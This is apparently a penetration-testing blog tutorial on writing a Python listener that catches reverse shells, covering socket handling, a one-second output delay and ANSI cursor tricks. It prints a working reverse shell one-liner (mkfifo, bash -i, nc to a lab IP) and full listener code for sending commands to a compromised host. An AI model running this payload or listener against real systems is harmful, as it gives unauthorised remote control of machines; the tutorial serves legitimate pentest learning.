---
layout: post
title:  "Creating a Basic Python Reverse Shell Listener"
date:   2021-10-16 17:00:10 +0200
tags: ["Pentesting Tips & Tricks","OSWE"]
---

# Introduction
This week I wanted to create a listener in python which functioned like the command `nc -lp [port]`, which is commonly used to catch reverse shells. At first, I thought it would be a piece of cake and would simply be something like reading the user input for a command, sending the command and retrieving the output of the command. However, it turned out to be a bit more complicated than I thought. As such, I decided to share the solution in a post.

The reason why it could be nice to be able to catch reverse shells using code rather than the netcat command (`nc`) is that it can facilitate automation. For example, if an exploit requries multiple listeners, the user of the exploit won't need to manually start the listeners. For instance, the script could be used in a more complex script which starts a listener that catches a reverse shell for a regular user, starts another listener, performs a set of privesc commands and then catches a root shell.

To debug the script, I used the reverse shell payload below. I would run this reverse shell payload on another host and catch it with either netcat or a python script while capturing the network traffic in Wireshark. This enabled me to study the differences between the communication resulting from both listeners and deduce what went wrong when something didn't work.

{% highlight bash linenos %}
mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.25 9999 >/tmp/f
{% endhighlight %}

# Challenges
There were two main challenges which I encountered while writing the code. The first was the problem of reading the input data of the user without displaying it twice in the terminal. This is a problem since the reverse shell payload presented earlier, and most other reverse shell payloads, echo the input of the user back to the user. Among other things, I searched for input functions which could receive input from the terminal and remove the input from the terminal once the user pressed enter to submit it.  

Unfortunately, there did not appear to be many options for input functions which differed from the classical `input()` function in this sense. When the `input()` function is used, it outputs the user input to the terminal together with a newline character. This means that the user input will appear twice since it is also echoed back from the reverse shell payload. As will be seen in the next section, this can be solved with ANSI escape codes.

The second challenge I encountered was that some commands needed some time to finish executing. For this, I didn't find a great solution and after a while I decided to simply introduce an artifical delay of 1 second before retreiving the output of the command. As such, commands taking more than the time limit to finish executing, would risk not having their output returned to the user. While this artrificial delay could impact the user experience, it is unlikely to be a problem when performing automated exploitation since the artificial delay could be increased to render the risk of missing output negligible.

# Writing the Code
The first step in writing the code is to import the required modules, as shown at the first line in the code block below. The "socket" module is required to be able to listen to for connections on a port, accept connections and send traffic over a connection. The `sys` module is used to write output to the terminal without newline characters since the `print()` function automatically appends a newline character to any data it outputs to the terminal. Finally, the `time` module is simply used for the artifical time delays. After importing the modules, we define the 'listen' function and call it with an ip and a port. This function is where all of the listeners code will be placed. Note that the ip must be an IP corresponding to your computer while the port can have an arbitrary value as long as this value corresponds to a port which is not in use by another program.

{% highlight python linenos %}
import socket, sys, time

def listen(ip,port):
    pass

listen("10.10.14.25",9999)
{% endhighlight %}

Next, we add the code below, which listens for a connection over TCP and accepts it. The first line defines a socket object with the parameters `socket.AF_INET` and `socket.SOCK_STREAM` which simply states that the socket will deal with IPv4 and TCP respectively. Then, on the second line, we bind the socket object to the port we want to listen on. Next, we use the `listen()` function to start listening on the provided port, passing `1` as a parameter to indicate that we only expect one connection. Thereafter, we wait for a connection at line 5, where we acquire the `conn` object which represents the connection and can be used to communicate with the connecting host.  
{% highlight python linenos %}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, port))
s.listen(1)
print("Listening on port " + str(port))
conn, addr = s.accept()
print('Connection received from ',addr)
{% endhighlight %}

Then, we add the three lines below to receive any initial characters from the reverse shell payload. This is usually the current user, hostname, current working directory and some special characters which function as delimiters. Once we have received this data, we output it to the terminal and ask the user for a command to execute using the `input()` function. Note that we need to use `decode()` function on the first line. This function is used to decode the bytes object obtained from `conn.recv(1024)`, into a string using the [UTF-8](https://en.wikipedia.org/wiki/UTF-8) character encoding.
{% highlight python linenos %}
ans = conn.recv(1024).decode()
sys.stdout.write(ans)
command = input()
{% endhighlight %}

The next step is to send the command to the other host, which can be achieved by the code snippet below. Here, we add a newline character to the command since the `input()` function returns the user input except for the newline character. Thereafter, we send the command on line 2 and wait for it to finish executing at line 3 by using the `time.sleep()` function to wait for one second before continuing. At this point, we should be able to wrap these two code snippets in a `while` loop and execute commands indefinitely. 
{% highlight python linenos %}
command += "\n"
conn.send(command.encode())
time.sleep(1)
{% endhighlight %}

This is, however, where things get slightly tricky. At this point, we encounter the first of the two challenges described earlier. Namely that the user input is also received from the compromised host's output and thus is outputted twice to the terminal, as can be seen in the picture below.
![pythonListenerWOCursorFix](/assets/2021-10-16-Creating-a-Basic-Python-Reverse-Shell-Listener/pythonListenerWOCursorFix.png)

A solution to the problem is to use [ANSI escape codes](https://en.wikipedia.org/wiki/ANSI_escape_code) which can be used to move the terminal cursor. Since the terminal cursor points to the place in the terminal where characters are written when sent to STDOUT, we can use this to remove the user input. More specifically, the idea is to remove the user input once it has been submitted and wait for the output of the compromised host to fill it in again, together with the corresponding output. A way to perform this is to move to the beginning of the line where the user input was submitted and output all the characters until the location where the user input was previously submitted. This can be achieved by adding the line below after the previous code snippet. In this line, the `sys.stdout.write()` function is used to write an ANSI escape code to the terminal together with the original line without the user input.
{% highlight python linenos %}
sys.stdout.write("\033[A"+ans.split("\n")[-1])
{% endhighlight %}
The ANSI escape codes is `\033[A` which moves the cursor up one line. Then, the last line which was recevied is outputted. This moves the terminal cursor to the place where the user entered the command. Note that the last line is obtained by splitting on the newline character `\n` and selecting the last line in the resulting list by using the index `-1`. Finally, note that it is important for the user experience to place this line after the `time.sleep(1)` line rather than before, since placing it before means that the user input could be gone while we are waiting for the command output.

# Final Code
Putting everything together, we get the code below which can be downloaded [here](/assets/2021-10-16-Creating-a-Basic-Python-Reverse-Shell-Listener/pythonListener.py). The only thing that has been added in this code is the `while` loop which simply ensures that the user can execute more than one command.

{% highlight python linenos %}
import socket, sys, time

def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Listening on port " + str(port))
    conn, addr = s.accept()
    print('Connection received from ',addr)
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

listen("10.10.14.25",9999)
{% endhighlight %}

For a demo of the script in action, see the video below.

<video width="100%" controls="controls">
  <source src="/assets/2021-10-16-Creating-a-Basic-Python-Reverse-Shell-Listener/pythonListenerDemo.mp4" type="video/mp4">
</video>

